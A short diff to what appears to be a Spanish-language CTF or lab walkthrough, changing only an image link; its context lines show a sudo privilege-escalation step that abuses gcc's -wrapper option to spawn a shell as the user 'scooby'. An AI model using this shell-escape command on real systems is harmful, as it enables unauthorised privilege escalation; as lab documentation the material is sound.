@@ -105,7 +105,8 @@ somos fred
 podemos escalar con gcc y donde mismo buscamos y lanzamos el comando:
 > sudo -u scooby /usr/bin/gcc  -wrapper /bin/sh,-s .
 
-![[usuario5.png]]
+![image](https://github.com/user-attachments/assets/29dd6cdd-705f-4bc7-8971-89a37228cdc4)
+
 
 somos scooby
 
